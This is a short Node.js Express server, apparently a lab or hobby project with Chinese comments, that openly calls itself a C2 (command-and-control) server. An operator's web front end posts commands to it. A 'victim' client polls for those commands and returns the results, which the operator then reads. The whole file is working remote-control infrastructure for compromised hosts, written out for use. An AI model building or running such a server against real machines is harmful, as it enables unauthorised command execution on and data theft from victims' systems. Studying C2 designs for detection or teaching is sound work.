const fs = require("fs/promises");
const express = require("express");
const bodyParser = require('body-parser')
const cors = require("cors");
const _ = require("lodash");
const { v4: uuid } = require("uuid");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }))

var router = express.Router();


var num = 10;
var command = "";
var commandresult = "";

// 在每一個請求被處理之前都會執行的 middleware
router.use(function(req, res, next) {

    // 輸出記錄訊息至終端機
    console.log(req.method, req.url);
  
    // 繼續路由處理
    next();
});

// http://192.168.98.128:3232/c2
router.get('/', function(req, res) {
    res.send('home page!');
});


// test get a num
router.get('/num', function(req, res) {
    res.send(num.toString());
    num += 1;
});

// Blazor web POST command
router.post("/updatecommand", (req, res) => {
    var info= req.body;
    command = info.command; // store command result
    console.log("update command: "+command);
});

// victim GET command
router.get('/command', function(req, res) {
    res.send(command);
});

// victim POST command result
router.post("/updatecommandresult", (req, res) => {
    var info= req.body;
    commandresult = info.result; // store command result
    command = ""; // clear command
    res.send("");
});

// Blazor web GET command result
router.get('/commandresult', function(req, res) {
    res.send(commandresult);
    commandresult = "";
});



// 設定root route
app.use('/c2', router);

app.listen(3232, () => console.log("C2 is running..."));